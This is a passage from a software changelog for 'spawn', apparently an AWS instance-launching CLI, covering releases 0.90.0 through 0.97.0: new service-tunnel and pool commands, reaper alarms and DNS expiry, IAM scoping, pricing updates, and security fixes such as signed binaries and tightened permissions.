  binary corresponds to no commit.

  The same defect is fixed in `spored` (was pinned at `0.1.0` for 97 releases —
  and it writes that value to the instance's `spawn:spored-version` tag, which
  `spawn upgrade-spored` reads to decide whether an upgrade took effect) and in
  `spawn-orchestrator` (was a `const`, which a build-time injection cannot write
  at all, so it could only ever report `0.1.0`).

- **A release can no longer publish binaries that misreport their own version.**
  Tagging now runs a guard that builds with the real release flags and asks each
  binary what it thinks it is, failing the release unless the answer is the tag.
  This closes the other half of the bug above: the version injection is a linker
  flag, and the linker accepts one that names a variable that no longer exists —
  silently. A rename would have built, released, and shipped binaries reporting
  `dev`, with no signal anywhere. The guard also refuses to publish while
  `CHANGELOG.md` still says `[Unreleased]`. Runnable before tagging with
  `make check-release-version TAG=vX.Y.Z`.

### Added
- **`spawn service` — run a long-lived HTTP service on an instance and tunnel to it
  (#409).** Launch a box, start an HTTP binary on it, and get back a local URL:

  ```
  spawn service ./my-server --instance-type m7i.large --upload ./my-server --ttl 2h
  ```

  This is the DCV-free sibling of the two shapes that already existed. `spawn launch
  --command` is batch — fire, complete, reap — and `spawn app` is long-lived but
  DCV-coupled, expressing readiness as an EC2 tag holding a browser URL. Neither
  could serve "run an HTTP binary and let me talk to it."

  spawn learns nothing about the workload. They meet at one JSON line the service
  prints to stdout when it starts serving, and one SSH port-forward:

  ```json
  {"event":"ready","addr":"127.0.0.1:54321","provenance":{"sourceHash":"…"}}
  ```

  The service picks its own port — only it knows what is free — and *announces* it,
  so spawn never polls a guessed port and hopes. `--addr 127.0.0.1:0` is appended to
  your command by default (change it with `--addr-args`, or pass an empty string to
  append nothing). Any HTTP binary that prints that line is spawnable by this one
  verb; no workload is named anywhere in spawn.

  Cost safety and lifetime are the same as every other launch path: the instance
  goes through the mandatory-TTL guard, so a `spawn service` with no `--ttl` gets a
  1h idle timeout rather than running until someone notices the bill, and `--dry-run`
  quotes the rate and the TTL-bounded maximum. Ctrl-C stops the service and
  terminates the instance; `--host` runs on an instance that is already running and
  leaves it alone. The service listens on the instance's loopback and is reachable
  only through the tunnel — it is never exposed to the internet.

  Two things that look like they should work, and don't, are handled explicitly:

  - **A readiness line is forgeable.** `init()` runs before `main`, so a workload can
    always print a well-formed line first — "first match wins" is defeated by
    construction. Each announced address is verified before it is trusted, and
    candidates are tried in order, so the real line wins.
  - **A TCP dial cannot verify a forwarded port.** `ssh -L` accepts connections on
    the local end whether or not anything is listening on the far side, so a
    successful connect proves only that ssh is running. Verification sends a real
    HTTP request through the forward; any status (401, 404, 500) counts as "a server
    is here", so an authenticated service isn't mistaken for a forged one.

  Closing the SSH session also does not reliably kill what it started — without a TTY
  there is no SIGHUP — so the remote command is wrapped to shut the service down when
  the session ends, instead of leaving it serving and billing until the TTL.
- **The ttl-reaper's failures are now observable, and alarm (#469, closing #457's
  failure mode A and #254's idea 3).** The reaper exists because #65 showed that a
  dead `spored` monitor loop lets instances run forever. That guarantee was only as
  good as our ability to notice when *the reaper* was the thing that had died — and
  it was not noticeable at all. `handler` always returned `nil`, so the Lambda
  `Errors` metric never moved however many scans failed; `Summary` went to one log
  line nothing read; the Slack webhook fired only on *successful* reaps; and the
  function had no metric filter and no alarm anywhere in either repo. A run whose
  every scan was refused looked exactly like a run with nothing expired.

  `Errors` is the only field in `Summary` that says a scan did **not** happen — every
  other field counts something that did — and it was pinned permanently nonzero by
  any single uninstalled account: credentials are lazy, so a deleted role surfaces
  as a per-region error, 11 regions × 6 runs/hour = 66/hour, forever. A counter that
  can never return to zero without a human editing a deploy parameter is not a
  signal, and #469 was originally filed as a request to quieten that noise. That was
  the wrong framing: the noise was a symptom of there being nothing listening.

  Failures are now classified (`AccessDenied`/`AccessDeniedException`/
  `UnauthorizedOperation` vs everything else, reusing the account-prober's proven
  code set) and aggregated **per account**, since the same role either works in
  every region or is refused in every region — eleven identical denials are *one*
  observation. `Errors` keeps its "investigate this" meaning for operational
  failures only; new `AccountsDenied` and `FSxAccountsDenied` fields carry the
  standing configuration facts. FSx is tracked separately on purpose: `fsx:*` is a
  different grant from `ec2:*`, so an account can scan instances perfectly and never
  reclaim a filesystem — which is #212 exactly, an FSx `AccessDenied` that presented
  as a silent no-op. Sharing one signal would let the EC2 success mask it again.

  Three fixed sentinel log lines exist *so they can be alarmed on*, with four
  CloudWatch alarms in the reaper's own `template.yaml` (`ALARMS_ENABLED`, default
  on; optional `ALARM_TOPIC_ARN`): reaching zero accounts in a run, an account
  refused everywhere, FSx refused everywhere, and the Lambda erroring outright —
  that last one because a run that dies never reaches the code emitting the others,
  so without it the loudest failure would be the quietest signal. The zero-accounts
  alarm text points at **our** side first: the reaper's role ARN embeds a
  CloudFormation-generated physical ID, so recreating the stack breaks every
  customer's trust policy simultaneously (#457), which is indistinguishable from the
  entire customer base uninstalling at once.

  A denied account is **still attempted every run** — quiescing means not counting
  it as a surprise, never ceasing to look. The portal registry's status annotates a
  denied-account line as corroboration only: it describes `spore-portal-onboard`,
  not the `spawn-ttl-reaper-ec2` role that just refused us, so it is a second
  opinion about a different door and can never gate anything. Nothing here deletes
  or terminates; it only classifies and reports.

### Changed
- **CI now fails on unformatted code.** Nothing did before: CI had no formatting
  check at all, and `make check` runs `gofmt -w`, which rewrites files and always
  succeeds — convenient locally, but it cannot fail a build, so it never gated
  anything. Three files sat unformatted on `main` for months and reappeared as
  unrelated diffs in whatever PR ran `make check` next.

  `make check-fmt` reports drift instead of fixing it — offenders listed with a
  diff — and now runs in CI, and at the end of `make check` so a local run agrees
  with CI rather than passing what CI will reject. The three drifted files are
  formatted (comment indentation and a trailing newline; no behavior change).
- Bumped the `substrate` test dependency v0.71.0 → v0.85.0 (root +
  `lambda/dns-updater`). Test-only; no runtime or API change. The reason to take
  it now is substrate#412: `RunInstances` previously accepted an empty `ImageId`
  and launched an instance, so the guard against launching without a resolved AMI
  had no offline test that could fail — the bug we filed it for **shipped**, and
  was caught only by a paid smoke test against real AWS. Substrate now returns
  `MissingParameter` / HTTP 400 when no AMI resolves from any source (request or
  launch template), so that path is reachable in `-short` tests. Substrate also
  fixed a request-parser defect found while fixing it: an explicitly-empty
  query-protocol *body* parameter was coerced to the bare-key sentinel `"1"`, so
  `ImageId=` arrived as the string `1` and launched from an AMI named `1` —
  affecting every EC2/IAM/STS/SQS/SNS parameter sent empty.

  Also newly testable offline: `Invalid*ID.NotFound` for explicitly-named EC2 IDs
  (substrate#391), symbolic `Error.Code` per service wire protocol instead of an
  HTTP status (substrate#392), `FunctionError`/`LogResult` omitted from a Lambda
  invoke unless applicable (substrate#393), S3 `Range` and conditional
  `If-Match`/`If-None-Match` requests (substrate#396, #397), `x-amz-checksum-*`
  verification (substrate#399), storage classes and `CopyObject` metadata
  directives (substrate#398), `Content-Encoding` surviving a multipart upload
  (substrate#406), and a seedable SQS create-then-lookup consistency window plus
  the correct `QueueDoesNotExist` error code — the legacy dotted
  `AWS.SimpleQueueService.NonExistentQueue` was not catchable as a typed error in
  either the Go or Python SDK, which is what the taskpool queue-lifecycle tests
  assert on (substrate#413).

  The v0.82.0–v0.85.0 span adds one fix we filed against a bug of our own making:
  substrate's `HeadObject` did not resolve a synthesized task-completion record,
  so `HEAD` answered 404 for a key `GET` served with a 200 body (substrate#457).
  That broke `aws s3 cp` on a completion record — the exact command `spawn task
  run` prints for users, since the CLI HEADs before it GETs — and it silently
  broke `pipeline.CheckCompletionMarker`, which polls a marker by `HeadObject`:
  absence reads as "still running", so a wait loop spun forever instead of
  failing. `cmd/task.go`'s `fetchCompletion` was unaffected only because it calls
  `GetObject` directly; that was luck, not design. Both verbs now agree, including
  under the clock gate. Also newly reachable offline: EC2 rejecting reserved
  `aws:`-prefixed tag keys (substrate#452) and honoring an explicit `ImageId` and
  `InstanceType` *alongside* a launch template rather than ignoring the template
  entirely (substrate#453) — `pkg/autoscaler` is the caller that passes both.

## [0.97.0] - 2026-07-31

### Added
- **`spawn pool create --s3-read`/`--s3-write` grant workers access to a task's
  own input/output buckets (#70).** Pool workers get read/write on the run's
  results/work bucket by default (least-privilege); when tasks stage from or write
  to other buckets, declare them at create with `--s3-read <bucket>` /
  `--s3-write <bucket>` (repeatable) and the worker IAM profile is widened
  accordingly (read buckets → GetObject + List; write buckets → Get/Put/Delete +
  List). Closes the per-task-bucket limitation noted when the scoped worker
  profile landed.
- **The ttl-reaper can now expire the DNS records of an account the portal has
  proven dormant (#466, closing the last open piece of #457).** The
  unmanaged-subdomain report (#458) deleted nothing, and its comment said why: a
  subdomain under an account absent from `REAPER_ROLE_ARNS` is ambiguous between
  "the customer uninstalled and left records" and "an active account nobody added
  to the list", and the two are indistinguishable *precisely because the reaper
  lacks the credentials* — `DescribeInstances` is how emptiness is proven. The
  portal's account-prober (spore-host/spore-host#492) assumes a role the registry
  *does* know about, proves emptiness across every region, and writes the verdict
  to `spore-portal-accounts`. The reaper now reads it: every report line carries
  the account's lifecycle status, and with `REAPER_DNS_EXPIRE=true` a `dormant` or
  `offboarded` account's A-records are deleted.

  Only `dormant` (emptiness proven through a working role) and `offboarded` (a
  human stated intent) qualify. `unreachable` deliberately does not — that is
  #457's trap 2: the moment we would most like to clean up is the moment the role
  we would have verified through is gone, so it needs a human rather than a longer
  wait. An account with no registry row, or an unreadable `Scan`, refuses and says
  so rather than falling back to a silent report.

  Two switches (`REAPER_DNS_SWEEP` **and** `REAPER_DNS_EXPIRE`) rather than one,
  because the sweep is already enabled in production: folding expiry into it would
  make an existing flag destructive on upgrade for a class of records it has never
  touched. Off by default, `REAPER_DRY_RUN`-aware, and A-records only (the #121
  friendly CNAMEs alias the A-record and carry no IP). The cost of being wrong is
  asymmetric, which drove that caution: `spored` registers DNS once at boot with no
  periodic re-registration, so a wrongly deleted A-record never self-heals — the
  spore keeps running and is simply unreachable by name until it reboots.

  The reaper holds `dynamodb:Scan` on the registry and nothing else — no
  `UpdateItem`, no `PutItem` — so a reaper bug cannot manufacture the eligibility
  it then acts on. New summary fields: `dns_expiry_eligible` /
  `dns_expiry_ineligible` / `dns_expired_records` (eligible-but-not-expired is the
  normal, healthy reading).

### Fixed
- **Pool workers are now resilient to an early exit (#465).** The on-instance
  worker ran `spored pool-worker` once at boot, so any early exit (a transient AWS
  error, an SQS blip) left a running-but-idle instance billing until its TTL. It
  now runs under a bounded restart-on-error loop: a non-zero exit re-execs (up to
  20 attempts, 10s apart), while a clean idle-drain (exit 0) stops and lets
  on-complete terminate the instance — so scale-to-zero is preserved and a
  transient failure recovers instead of stranding a worker.
- **`make build` in `lambda/ttl-reaper` built `main.go` instead of the package**, so
  a second source file in that module would have been silently omitted from the
  deployed binary. Now builds `.`.

## [0.96.3] - 2026-07-31

### Fixed
- **Pool workers now get an IAM profile that can actually reach the queue (#70).**
  `spawn pool create` gave workers the bare shared spored role, which grants no
  SQS access — so a worker's `GetQueueUrl` returned `NonExistentQueue` (SQS masks
  access-denied as not-found), it never pulled a task, and the pool stalled with
  the queue full. Workers now get a **scoped instance profile** (like
  `spawn task run`) granting SQS on THIS run's queue only
  (GetQueueUrl/ReceiveMessage/DeleteMessage/GetQueueAttributes), S3 read on the
  spawn-binaries buckets (spored bootstrap) and read/write on the spec/results
  bucket. Found by a real-AWS smoke. (Known limitation: a task's own input/output
  buckets beyond the results bucket aren't granted at pool-create time.)

## [0.96.2] - 2026-07-31

### Fixed
- **Pool workers no longer exit at boot when they resolve the queue before it's
  visible (#70).** `taskpool.OpenQueue` did a single `GetQueueUrl`; because that
  call is eventually consistent after the submitter's `CreateQueue`, a freshly
  booted worker could race the create and get `NonExistentQueue`, then exit
  immediately (the worker runs once at boot) — so the pool never drained even
  though the queue existed seconds later. `OpenQueue` now retries a
  `NonExistentQueue` through the consistency window (bounded; any other error
  still fails fast). Found in a real-AWS re-smoke.

## [0.96.1] - 2026-07-31

### Fixed
- **spored bootstrap now retries a transient checksum/binary download instead of
  hard-failing the install (#462).** The install verified the binary against a
  `.sha256` fetched with a single-shot `curl -f`; a transient S3 hiccup (observed
  as `curl (52) Empty reply from server` in a #70 smoke) on that one call aborted
  the whole spored install — so the instance came up with no spored and never ran
  its workload, even though the artifact was present. The binary download, the
  checksum fetch, the `.sig` fetch, and the up-front `.sig` HEAD probe now all use
  `curl --retry ... --retry-all-errors`, so a flaky response is retried rather
  than fatal. (The artifacts were verified present and reachable; this was a
  robustness gap, not a missing/misnamed release artifact.)
- **`spawn pool create` now launches workers that actually boot (#70).** The
  pooled-worker launch built a raw `LaunchConfig` and called `RunInstances`
  directly (via the taskcohort Actuator), skipping the AMI auto-detect and IAM
  instance-profile setup that the `launcher.Provision` path does — so every worker
  failed with `MissingParameter` (RunInstances requires an ImageId) and the pool
  never reached min-viable. `create` now resolves the recommended AMI and the
  spored instance profile once up front (workers are homogeneous) and launches
  with a complete config. Found by a real-AWS smoke test.
- **A failed `spawn pool create` no longer leaks its SQS queue (#70).** The queue
  is created before workers are provisioned; if provisioning fails there are no
  workers to drain it, so `create` now deletes the queue on the failure path
  instead of leaving an orphaned `spawn-pool-<run>` queue behind.
- **`spawn pool create` reports WHY provisioning failed (#70).** On a pool that
  can't reach min-viable, it now renders each worker's terminal fault (the AWS
  error code + phase the cohort recorded) instead of an opaque "failed to reach
  min viable" with no cause.

## [0.96.0] - 2026-07-31

### Security
- **Pooled worker task workspaces are now created `0700`, not world-writable (#70).**
  `taskpool.DirWorkspace.Acquire` created per-task dirs `0777`; since the pooled
  job script runs as the same user that creates the dir (spored is root; the
  pooled job script has no `su -`), world-writable only exposed a live task's
  workspace — including the `.spawn-job.sh` about to execute — to tampering by any
  local account. The dir is now `0700`, with the mode set explicitly (MkdirAll
  skips chmod on an existing dir) so a stale/raced dir can't retain loose perms.

### Added
- **ttl-reaper: unmanaged-subdomain report (#457).** The #438 DNS sweep is
  per-account and only ever looks at accounts listed in `REAPER_ROLE_ARNS`, so
  records belonging to an account *absent* from that list were invisible to it —
  no sweep, no error, no signal at all. The sweep now also walks the zone once per
  run, decodes each `{base36}` label back to an account ID (`dns.DecodeAccountID`,
  the new inverse of `EncodeAccountID`), and logs every subdomain whose account it
  holds no credentials for, counted as `DNSUnmanagedSubdomains` /
  `DNSUnmanagedRecords`.
  - **Report-only; it deletes nothing.** An unmanaged subdomain is ambiguous — an
    account that uninstalled, or a live one someone forgot to add to
    `REAPER_ROLE_ARNS` — and without credentials there is no way to tell which,
    since `DescribeInstances` is how emptiness is proven. Deleting on the second
    reading would tear the DNS out from under working spores. Same reasoning as
    the sweep's existing refusal to delete against a partial live set.
  - The hazard it surfaces: a released public IP returns to the EC2 pool, so an
    abandoned A-record eventually resolves to an *unrelated* instance. Found live
    in `spore.host` (`4zlw3a1t.spore.host`, account 390967728545 — not in the org,
    no cross-account role); the report flags exactly that record and nothing else.
    Broader deprovisioning lifecycle tracked in #457.
  - `DecodeAccountID` rejects ordinary DNS labels exactly rather than
    heuristically: every 12-digit account ID is precisely 8 base36 characters
    (36^7 < 10^11 and 36^8 > 10^12), so `www`/`api` decode far outside the account
    range and can never masquerade as accounts. Classification is a pure function
    (`unmanagedSubdomains`), unit-tested without AWS.
- **Pooled execution for wide fan-out — `spawn pool` (#70).** A new execution
  mode that runs a wide fan-out as a POOL of fungible worker instances draining a
  shared task queue, instead of one ephemeral instance per task. At high fan-out
  the one-instance-per-task model is dispatch-bound and pays a full instance boot
  per task, so short tasks self-terminate faster than new ones launch and
  concurrency can't reach N; a pool inverts this — N workers pull tasks from a
  run-scoped SQS queue and reuse across jobs (per-job cost is stage+run only).
  - `spawn pool create --run-id R --workers N --instance-type T` provisions the
    workers as a **partial cohort** (best-effort/eventual: ask for N, accept
    `--min-viable`, degrade gracefully — a short pool means lower parallelism,
    never failure) and creates the queue. `spawn pool submit --spec f.json`
    stages a TaskSpec to S3 and enqueues it; `spawn pool status` shows queue
    depth; `spawn pool drain` deletes the queue.
  - Workers run `spored pool-worker`: claim a task (SQS visibility-timeout = the
    claim; a worker that dies before ack redelivers to another — the task-level
    echo of cohort's reaped-worker replacement), fetch the spec, run it in a
    **clean per-task workspace** (isolation on reuse), ack, and self-terminate on
    idle-timeout (scale to zero; the reaper backstops a missed drain).
  - Built on the existing cohort core (`pkg/taskcohort` — the fungible-pool
    provider seam, a task-fan-out sibling of `pkg/mpicohort`) with **no cohort
    changes**, and on the shared TaskSpec protocol (`pkg/taskpool` reuses the
    `spawn task run` stage/run/complete wrapper per job, minus the self-terminate
    signal so a worker survives to run the next task). Reusable by any workflow
    adapter, not just nf-spawn. See `docs/pooled-task-execution-design.md`.

### Fixed
- **The #438 DNS reconciliation sweep could not be enabled through `make deploy`
  (ttl-reaper).** `DnsSweep` — along with `DnsZoneId` and `DnsDomain` — was never
  passed in the deploy target's `--parameter-overrides`, and `sam deploy` marks
  any parameter it isn't given as `UsePreviousValue`. So the documented
  `REAPER_DNS_SWEEP` knob was unreachable from the repo's own deploy path: on an
  existing stack it silently kept whatever was already deployed, and on a fresh
  stack it fell back to the template default (`false`). The sweep shipped working
  but off, with no supported way to turn it on. All three DNS parameters are now
  passed explicitly (`DNS_ZONE_ID` / `DNS_DOMAIN` / `DNS_SWEEP`), the README shows
  the enabling invocation, and the verify section says to confirm `dns-sweep=true`
  on the init line rather than assuming the feature is live.
- **`make deploy` (ttl-reaper) failed, or silently mis-set parameters, whenever one
  was empty.** `sam` matches the whole `--parameter-overrides` string against a
  single regex, and an empty value breaks that match — so with several pairs and one
  empty (`NOTIFY_URL`, `DNS_ZONE_ID` and `DNS_DOMAIN` are all empty by default) it
  either rejected the invocation outright or fell through to another pattern and
  mis-keyed every parameter, in one observed case swallowing `NotifyUrl` as a
  literal key named `ParameterKey`. That silent form is the dangerous one: the
  deploy succeeds having applied something other than what was asked for. Overrides
  now go through a generated `file://` params file, the only form that handles empty
  values, and the deploy echoes the mode-setting parameters (never the webhook) so a
  deploy can't quietly leave a feature off.

### Changed
- **The ttl-reaper sweep's in-scope rules are now a pure, tested function
  (`sweepableRecord`).** Deciding which Route53 records the #438 sweep may delete
  was inline with the paginated `ListResourceRecordSets` call and therefore
  untestable — the highest-consequence logic in the sweep, since a record wrongly
  judged in-scope is a live-DNS outage. Extracted with no behavior change and
  covered for each exclusion: the subdomain apex, the zone apex, another account's
  subdomain, a deceptively similar suffix, the #121 friendly CNAMEs, and alias
  A-records (which carry an AWS target rather than an IP).

### Documentation
- **Design doc: pooled task execution for wide fan-out (nf-spawn#70).**
  `docs/pooled-task-execution-design.md` captures the reusable spawn pooled
  execution design — fungible workers provisioned as a cohort that pull TaskSpecs
  from a run-scoped queue and reuse across jobs — that the `spawn pool` feature
  (above) implements. Reuses `pkg/mpicohort` (adapter precedent), `pkg/queue`
  (single-instance job runner), and `spore-host/cohort` (partial cohort +
  warm-start + capacity fallback).

## [0.95.0] - 2026-07-29

### Added
- **`spawn plugin search` and `spawn plugin info` — find plugins before you
  install them (#448).** There was no way to ask what plugins exist: you had to
  already know a name, and a typo was indistinguishable from a plugin that had
  never been written (both 404). `search` lists the official registry, with an
  optional query matched against names and descriptions, and flags a plugin that
  wants root on the instance. `info <name>` shows its version, description,
  config keys (marking which are required), and declared capability surface, and
  suggests near-matches when the name misses. Both read a generated index that
  the registry publishes, cached under `~/.spawn/cache` so they work offline —
  and both always print where the listing came from and how old it is, so a
  cached answer is never mistaken for a current one. `--refresh` refetches.
  Discovery covers the official `spore-host/spore-plugins` registry only; see
  the PR for why third-party entries are deferred.

### Fixed
- **Registry URLs are now pinned by tests.** The official registry keeps specs
  under `plugins/<name>/plugin.yaml` while a third-party `github:` repo keeps
  `<name>/plugin.yaml` at its root; no test recorded which URL a ref actually
  resolved to, so either layout could regress silently into an install-time 404
  (#448). The `--insecure`-path and traversal-rejection URLs are covered too.
- **A registry ref that fails validation no longer logs an "installing plugin
  from unverified source" warning** before being rejected.

### Security
- **Updated `golang.org/x/text` to v0.39.0 for CVE-2026-56852** (HIGH). A
  `norm.Iter` can enter an infinite loop on certain input, so any code
  normalizing untrusted text could hang. Bumped across all three modules —
  the root module and both Lambda modules (`dns-updater`, `ttl-reaper`), which
  pinned it independently.

## [0.94.0] - 2026-07-28

### Added
- **`spawn onboard` — bring your own AWS account onto the spore.host portal from
  the CLI (#443).** The equivalent of the web CloudFormation quick-create, run
  with credentials for the account you're onboarding. It resolves the account via
  STS, generates a high-entropy per-account ExternalId as a confused-deputy guard,
  idempotently creates the `spore-portal-onboard` cross-account role with the EC2
  launch / SSM / scoped `iam:PassRole` permissions the portal needs, and SigV4-POSTs
  the registration to the portal so the account registers itself — no copy-paste
  of role ARNs. `--skip-phone-home` creates the role without registering, and
  `--json` emits the result for scripting.
- **`--region` on `spawn slurm estimate` and `spawn slurm submit`.** GPU
  On-Demand rates vary by up to 70% between regions, so the estimate is priced
  per-region: `--region`, else the script's `#SPAWN --region`, else your AWS
  config region.
- **The dashboard API accepts a federated portal identity (#445).** A caller who
  assumed a trusted portal launch role (`spore-portal-launch` by default,
  extendable via `SPAWN_DASHBOARD_PORTAL_ROLES`) is now a first-class user scoped
  by their own verified AWS account — no Cognito email or CLI link step. The
  account always comes from the SigV4-verified caller, so trusting a role name
  can't widen access beyond the account that already holds it.

### Changed
- **`spawn slurm estimate` / `submit` now quote live AWS prices instead of a
  hardcoded table (#447).** Rates come from truffle, the suite's pricing
  authority, which reads the AWS Price List and Spot history for the actual
  region. The table spawn used had drifted badly: p4d was overstated by 49% and
  p5 by 79%, and spot was assumed to be a flat 70% off On-Demand when the real
  discount ranges from 38% to 62%. Both commands now also print the $/hr each
  total was computed from, the region priced, and the real spot discount, so the
  figure can be checked against the AWS console. If no On-Demand rate can be
  read, the estimate now **fails with an error** rather than quoting $0.00 or a
  guess — this number gates a billable launch.
- **GPU instance selection re-sourced from current hardware (#447).** Added the
  g6 (L4), g6e (L40S), g7 (RTX PRO 4500), g7e (RTX PRO 6000), p4de (A100 80GB),
  p5e/p5en (H200) and p6-b200/p6-b300 (Blackwell) families, so a `--gres=gpu:`
  request for modern hardware can actually be satisfied. `p5.4xlarge` in
  particular is now selectable — it is the only H100 size that doesn't require
  renting all 8 GPUs, so single-GPU H100 jobs no longer land on a type costing 8×
  more. `--gres=gpu:` also accepts the gres spellings for these GPUs
  (`nvidia_h100`, `h200-141gb`, `rtx_pro_6000`, and so on).
- **`slurm estimate` no longer fails on an instance type outside spawn's
  selection table.** A `#SPAWN --instance-type` override naming any type AWS
  offers is now priced normally; the vCPU/memory/GPU spec lines are simply
  omitted for a type spawn doesn't select from.
- **truffle v0.38.1 → v0.48.0.** Brings truffle#114: a rate the AWS Price List
  can't supply is now an error rather than a guess from the instance family. This
  affects the `$/hr` shown by `spawn task --dry-run`, which used truffle's
  default pricer — a type that region doesn't offer previously showed a fabricated
  rate (`hpc7a.96xlarge` at $0.20/hr against a real $7.20) and now shows no price
  at all, with the sizer ranking unpriced candidates last as before. Also picks up
  a fix for a nil search pattern crashing the process, and correct SageMaker rate
  selection.

### Removed
- **The p3 (V100) instance types are gone from Slurm instance selection (#447).**
  AWS no longer offers p3 in us-east-1, us-east-2, us-west-2 or eu-west-1, so
  selecting one produced an instance type that could not launch — surfacing as an
  opaque `RunInstances` failure. A `--gres=gpu:v100` script still works: it now
  resolves to a current successor GPU (A10G/L4/L40S/H100 and later) instead of
  dead hardware. T4 is deliberately excluded as a successor — it matches on VRAM
  but is a large step down in compute.
- **BREAKING (library):** `slurm.EstimateCost(job)` is removed, replaced by
  `slurm.EstimateCostWithPricer(ctx, job, pricer, region)` plus
  `slurm.TotalInstanceHours(job)` for the credential-free half. There is no
  compatibility shim on purpose: any shim would have to keep reading the drifted
  table, which is the bug. `InstanceTypeSpec.Price` is likewise renamed to
  `InstanceTypeSpec.RelativeCost` to make clear it ranks candidates and is not a
  price.

### Fixed
- **`spawn onboard` no longer needs `SPORE_PORTAL_PHONE_HOME_URL` set (#444).**
  The phone-home URL now defaults to the deployed endpoint for the active
  environment instead of returning empty, so onboarding auto-registers out of the
  box. The env var still overrides, matching how the role ARN already resolved.

### Security
- **Slack app secrets moved out of plaintext Lambda environment variables (#446).**
  The dashboard API's Slack `client_secret` and `signing_secret` were readable by
  anyone with `lambda:GetFunctionConfiguration` and shown in the console/CLI. They
  now live in one Secrets Manager secret (`SLACK_SECRETS_ARN`), with the exec role
  granted `secretsmanager:GetSecretValue` on just that ARN and the value cached per
  warm Lambda. The legacy env vars still work as a fallback so the code can deploy
  before the secret is wired and the vars removed after — no flag-day.

## [0.93.1] - 2026-07-23

### Fixed
- **spored now installs in all regions, not just the US (#440).** The release
  workflow published the spored binary to 4 US `spawn-binaries-*` buckets only,
  relying on a bootstrap fallback to us-east-1 for the other 7 regions. But those
  regional buckets still held a stale, **unsigned** binary from a prior release —
  so the bootstrap's regional fetch *succeeded* (the fallback never fired) and
  then, with signature verification on (the default), the missing `.sig` made the
  install **fail closed** (`exit 1`) in ca-central-1 / eu-* / ap-*. Instances
  there came up with no spored — no TTL/idle enforcement, no DNS. Two-part fix:
  (1) the release now publishes the signed binary to **all 11 regions** spawn
  operates in; (2) the bootstrap now **probes a source's `.sig` before committing
  to it** when verifying, so a stale/unsigned regional bucket falls through to the
  us-east-1 fallback instead of downloading-then-hard-failing.

## [0.93.0] - 2026-07-23

### Added
- **ttl-reaper: opt-in DNS reconciliation sweep (#438).** With `REAPER_DNS_SWEEP=true`
  (and a hosted zone configured), the reaper now lists each account's
  `{base36}.{domain}` A-records and deletes any whose IP has no live
  (`running`/`pending`) `spawn:managed` instance. This reclaims DNS records
  orphaned when an instance exits **abruptly** — hard crash, out-of-band
  `TerminateInstances`, or a fast spot reclaim — and has since aged out of the EC2
  API, which the instance-driven teardown (#247) can't see. Aborts without deleting
  if a region's live-instance scan errors (never deletes against a partial live
  set) and honors `REAPER_DRY_RUN`. Off by default.

### Fixed
- **DNS registration failures are no longer silent (#435).** When spored's DNS
  registration is rejected — e.g. a `403` from the DNS Lambda Function URL after
  the `AuthType: AWS_IAM` cutover — the failure was swallowed: the client parsed
  the `403` body as a normal response and produced an empty `DNS API error:`, and
  even the real message only reached the instance's own journal. Now the client
  checks the HTTP status and surfaces the code + body, spored records the outcome
  as `spawn:dns-status`/`spawn:dns-error` instance tags, and `spawn status` shows
  a clear warning when registration failed (so the FQDN "never resolves" symptom
  is diagnosable from the launch side). DNS request signing now also **fails
  closed on empty credentials** — if the instance role isn't yet reachable via
  IMDS, spored no longer sends an effectively-unsigned request that the AWS_IAM
  Function URL rejects with a silent 403; it reports the credential problem
  instead.
- **spored now logs when it skips DNS registration because no DNS name is
  configured (#435).** Previously an instance launched without a `spawn:dns-name`
  tag skipped registration completely silently, which made a *launcher* that
  forgot to emit the tag (e.g. a third-party client) look like a broken
  spored/registration path. spored now logs `DNS registration skipped: no DNS
  name configured`, so the cause is obvious from `/var/log/spored.log`.

### Documentation
- Corrected the base36 account-ID example in `pkg/dns/encoding.go` (and a matching
  comment in the DNS-updater Lambda): `123456789012` encodes to `1kpqzg2c`
  (≤8 chars), not the stale `1s69p4h` (#434). Code was already correct.

## [0.92.0] - 2026-07-22

### Added
- **`spawn status` now shows a "Lifecycle protection" summary** for a running
  managed instance: in-instance (spored) enforcement, the out-of-band reaper
  backstop (described as "if deployed" — it isn't authoritatively visible from the
  launch account), the hard termination deadline (from the launch-anchored
  `spawn:ttl-deadline` tag, with time remaining), a worst-case compute-cost ceiling
  by that deadline (on-demand rate, compute only), and the idle timeout. Surfaces
  the safety model the docs describe directly in the CLI.

### Security
- **CLI release artifacts are now signed** with keyless cosign (Sigstore) + SLSA
  build provenance (spawn#430). The release signs `checksums.txt` (which lists
  every archive/package hash) with the workflow's GitHub OIDC identity — no
  long-lived key — publishing `checksums.txt.bundle`, and attests build provenance.
  This is separate from and complementary to spored's existing KMS publisher-signing
  + boot verification. Verify a download with `cosign verify-blob --bundle`
  (see docs: "Verify a download"). Takes effect from the next tagged release.
- **Bump `google.golang.org/grpc` → 1.82.1** in the root and `lambda/dns-updater`
  modules (was 1.82.0 / 1.80.0, both indirect) — resolves GHSA-hrxh-6v49-42gf
  (gRPC-Go xDS RBAC / HTTP/2, HIGH).

## [0.91.1] - 2026-07-21

### Fixed
- **Release signing of spored now works.** The v0.91.0 release pipeline failed to
  sign spored (KMS `Sign` rejects a request over ~200KB, but spored is ~80MB, and
  the release role couldn't write the `.sig` objects). Signing now signs the
  SHA-256 *digest* (`--message-type DIGEST`) and the role can publish the
  signatures, so signed spored binaries actually reach the buckets. Verification
  is unchanged (`openssl dgst -sha256 -verify`). (spore-host#440)

## [0.91.0] - 2026-07-21

### Security
- **spored signature verification is now active.** The spore.host signing public
  key (KMS `alias/spored-signing`, ECDSA_SHA_256) is embedded in spawn, so the
  generated bootstrap verifies each spored binary's signature before executing it
  (spore-host#440). Combined with the release pipeline now signing spored with the
  matching KMS key, boot-time verification authenticates the publisher, not just
  detects corruption. Fails closed on a missing or invalid signature.

## [0.90.0] - 2026-07-21

### Added
- **`spawn doctor` — a read-only preflight command.** Checks everything a first
  launch needs and reports pass / warn / fail for each: spawn & truffle versions,
  AWS CLI, credentials, resolved account (with an optional `SPORE_ACCOUNT` match),
  region, EC2 describe + launch permissions (via a dry-run `RunInstances`), IAM
  instance-profile access, the spored instance profile, a usable VPC/subnet,
  Session Manager, and optional features (TTL reaper backstop, Route 53 → warn).
  It launches and changes nothing, and exits non-zero if a core prerequisite
  fails — so "if `spawn doctor` passes, the Quick Start should work." Especially
  useful on institution-managed accounts: the failing IAM checks are exactly what
  to hand a cloud administrator. `-o json` for automation.
### Security
- **spored binaries can now be verified by publisher signature at boot, not just
  by checksum** (spore-host#440). The bootstrap previously fetched a `.sha256` from
  the *same* S3 bucket as the spored binary — which detects corruption but can't
  prove authenticity (an attacker who rewrites the bucket rewrites the checksum
